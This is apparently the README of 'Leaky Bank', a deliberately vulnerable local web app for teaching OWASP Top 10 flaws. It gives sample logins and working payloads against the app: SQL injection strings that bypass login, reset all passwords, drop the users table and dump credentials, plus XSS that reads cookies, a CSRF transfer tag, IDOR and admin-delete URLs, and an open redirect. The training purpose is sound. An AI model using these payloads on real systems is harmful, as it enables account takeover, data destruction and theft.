#Introduction

*Leaky Bank* is an educational web application that illustrates some of the top 10 OWASP 2013 vulnerabilities:

- Injections,
- Broken Authentication and Session Management,
- Cross-Site Scripting (XSS),
- Insecure Direct Object References,
- Missing Function Level Access Control,
- Cross-Site Request Forgery (CSRF),
- Unvalidated Redirects and Forwards.

By default, *Leaky Bank* is only available on localhost, you should not make it available on a network. 


# How to use Leaky Bank
*Leaky Bank* requires a valid installation of Java 8. To start leaky bank, execute this command line:

	java -jar leakybank-<version>.jar

Then, *Leaky bank* is running under http://localhost:8080.

##Sample users

### User 1:

- login: alice,
- password: aliceP@ssw

### User 2:

- login: bob,
- password: bobP@ssw

### Admin user:

- login: admin
- password : adminP@ssw


# Vulnerabilities

## A1 - Injection

Reference: https://www.owasp.org/index.php/SQL_Injection

All SQL request to the embedded HSQLDB database are built using string concatenation with http request params. So most of them are vulnerable to SQL injections.

### Example on login page: 

#### bypass password check:

login: 

	alice'--
	
password: any value

#### Log as administrator without password check:

login: 

	alice'; select LOGIN, FIRST_NAME, LAST_NAME, true as IS_ADMIN from USERS where login='alice'--
	
password: any value

#### update password of all users :
login: 

	alice'; update USERS set password='qwerty'--

password: any value

#### update password of one users :
login: 

	alice'; update USERS set password='qwerty' where user='bob'--

password: any value

#### Drop a table :
login: 

	alice'; DROP TABLE users CASCADE --

password: any value

#### Extract list of users/password :
login:

	alice'; select 'alice' as LOGIN, (SELECT GROUP_CONCAT(login) FROM USERS) as FIRST_NAME, (SELECT GROUP_CONCAT(password) FROM USERS) as LAST_NAME, password, is_admin from USERS where login='alice'--

password: any value

#### update password of one users :
login:

	alice'; update USERS set password='qwerty' where user='bob'--

password: any value


#### List SQL tables and columns names:

login:

	alice'; select 'alice' as LOGIN, (SELECT  GROUP_CONCAT(DISTINCT CONCAT(TABLE_NAME, '.', COLUMN_NAME) order by TABLE_NAME) FROM INFORMATION_SCHEMA.SYSTEM_COLUMNS) as FIRST_NAME, LAST_NAME, PASSWORD, IS_ADMIN from USERS where login='alice'--


## A2 - Broken Authentication and Session Management

Reference: https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management

- Sessions does not expire, 
- Session is not recreated after login,
- It is possible to pass session Id in url: http://localhost:8080/login;jsessionid={sessionID}

So, *Leaky bank* is vulnerable to session fixation attack : https://www.owasp.org/index.php/Session_fixation.


## A3 - Cross-Site Scripting (XSS)

Reference: https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)

### Reflected XSS
All pages supports a message parameters in the url that is used to display a confirmation messages.

This parameter is injected in JavaScript :

	var message = '${request.message}';

Example:

	http://localhost:8080/login?message=';alert(document.cookie);//
	
### Stored XSS
There is no sanitization of "description" field in the money transfer features, and transactions description are displayed without escaping in account detail page.

Exemple: 

	XSS !!! <script>alert(document.cookie)</script>
	
### Examples

Replaces all the links in the page with http://fr.wikipedia.org/wiki/Cross-site_scripting :

	http://localhost:8080/accounts?message=%27;window.setTimeout%28function%28%29{$(%27a%27).attr(%27href%27,%20%27http://fr.wikipedia.org/wiki/Cross-site_scripting%27);},500%29;var%20f=%27b


Submit a money transfer:

	http://localhost:8080/accounts?message=';$.get("/transfers/new?debitAccount=100124%26creditAccount=100223%26amount=15000%26description=XSS");//


## A4 - Insecure Direct Object References

Reference: https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References

Accounts number is directly passed in the url of account details pages : http://localhost:8080/accounts/100123, and there is no access control on the accounts. So it is possible to bruteforce and reads transactions of all the available accounts :

	http://localhost:8080/accounts/100223
	

## A7 - Missing Function Level Access Control

Reference: https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control

User deletion feature does not check that user is an administrator: 

	GET http://localhost:8080/admin/users/<login>/delete


## A8 - Cross-Site Request Forgery (CSRF)

Reference: https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_(CSRF)

There is no protection against CSRF, so money transfer is vulnerable to CSRF.

Example: Create an html page with img tag with the following url: 

	<img src="http://localhost:8080/transfers/new?debitAccount=100124&creditAccount=100223&amount=15000&description=This+is+a+CSRF+!!!"/>



## A9 - Unvalidated Redirects and Forwards

Reference: https://www.owasp.org/index.php/Top_10_2013-A10-Unvalidated_Redirects_and_Forwards

When user tries to consult a page that requires authentication, it automatically redirected to the login page. After authentication, it is then redirected to the initial requested page. This mechanism uses an optional parameter "targetUrl", in the login page url: 

	http://localhost:8080/login?targetUrl=/accounts/100124
	
This parameter is not sanitized, so it is possible to redirect the user to an other domain after login : 

	http://localhost:8080/login?targetUrl=https://www.owasp.org/index.php/Top_10_2013-A10-Unvalidated_Redirects_and_Forwards
	

